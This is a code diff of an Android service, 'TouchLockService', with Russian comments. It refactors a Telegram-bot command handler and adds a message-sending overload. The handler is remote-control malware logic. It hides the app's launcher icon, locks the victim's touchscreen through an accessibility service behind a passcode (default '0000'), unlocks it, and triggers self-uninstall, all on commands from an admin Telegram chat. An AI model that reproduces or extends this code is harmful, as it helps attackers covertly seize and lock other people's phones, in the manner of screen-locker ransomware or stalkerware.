@@ -15,7 +15,7 @@ public class TouchLockService extends Service {
     private OkHttpClient client;
     private long lastUpdateId = 0;
     private String adminChatId = "";
-    private int lastOnlineMessageId = -1; // ID для "Бот онлайн"
+    private int lastOnlineMessageId = -1;
 
     @Override
     public void onCreate() {
@@ -64,37 +64,12 @@ public class TouchLockService extends Service {
         }).start();
     }
 
-    private void handleCommand(String cmd, String[] parts) {
-        if (cmd.equals("/hide")) {
-            updateIconStatus(false);
-            sendTelegramMessage("👻 Иконка скрыта", false);
-        } else if (cmd.equals("/show")) {
-            updateIconStatus(true);
-            sendTelegramMessage("👁 Иконка возвращена", false);
-        } else if (cmd.equals("/killme")) {
-            sendTelegramMessage("💀 Запуск удаления...", false);
-            updateIconStatus(true);
-            if (TouchLockAccessibilityService.instance != null) TouchLockAccessibilityService.instance.unlock();
-            new Handler().postDelayed(() -> {
-                Intent intent = new Intent(Intent.ACTION_DELETE);
-                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-                stopSelf();
-            }, 2000);
-        } else if (TouchLockAccessibilityService.instance != null) {
-            if (cmd.equals("/block")) {
-                String pass = (parts.length > 1) ? parts[1] : "0000";
-                TouchLockAccessibilityService.instance.lock(pass);
-                sendTelegramMessage("🔒 Заблокировано. Код: " + pass, false);
-            } else if (cmd.equals("/stop")) {
-                TouchLockAccessibilityService.instance.unlock();
-                sendTelegramMessage("🔓 Разблокировано", false);
-            }
-        }
+    // Перегруженный метод: для вызова с одним аргументом
+    public void sendTelegramMessage(String message) {
+        sendTelegramMessage(message, false);
     }
 
-    // Универсальный метод отправки
+    // Основной метод для отправки и удаления "Онлайн" сигнала
     public void sendTelegramMessage(String message, boolean isOnlineSignal) {
         if (adminChatId.isEmpty()) return;
         new Thread(() -> {
@@ -111,6 +86,36 @@ public class TouchLockService extends Service {
                 }
             } catch (Exception ignored) {}
         }).start();
+    }
+
+    private void handleCommand(String cmd, String[] parts) {
+        if (cmd.equals("/hide")) {
+            updateIconStatus(false);
+            sendTelegramMessage("👻 Иконка скрыта");
+        } else if (cmd.equals("/show")) {
+            updateIconStatus(true);
+            sendTelegramMessage("👁 Иконка возвращена");
+        } else if (cmd.equals("/killme")) {
+            sendTelegramMessage("💀 Запуск удаления...");
+            updateIconStatus(true);
+            if (TouchLockAccessibilityService.instance != null) TouchLockAccessibilityService.instance.unlock();
+            new Handler().postDelayed(() -> {
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                stopSelf();
+            }, 2000);
+        } else if (TouchLockAccessibilityService.instance != null) {
+            if (cmd.equals("/block")) {
+                String pass = (parts.length > 1) ? parts[1] : "0000";
+                TouchLockAccessibilityService.instance.lock(pass);
+                sendTelegramMessage("🔒 Заблокировано. Код: " + pass);
+            } else if (cmd.equals("/stop")) {
+                TouchLockAccessibilityService.instance.unlock();
+                sendTelegramMessage("🔓 Разблокировано");
+            }
+        }
     }
 
     private void updateIconStatus(boolean show) {
